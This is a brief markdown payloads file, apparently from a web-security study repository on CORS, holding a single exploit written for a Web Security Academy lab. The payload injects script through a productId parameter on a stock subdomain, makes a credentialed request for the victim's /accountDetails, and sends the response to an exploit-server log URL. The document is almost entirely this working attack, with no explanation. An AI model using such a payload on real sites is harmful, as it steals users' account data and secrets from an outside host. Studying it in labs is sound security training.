# Payloads

Add your payloads, scripts, or exploit samples for Cross-Origin Resource Sharing here.




```
<script>
    document.location="http://stock.0a9200cf0461bfb180fa030500ac009f.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a9200cf0461bfb180fa030500ac009f.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a4800b2040dbf6e80be022201890015.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```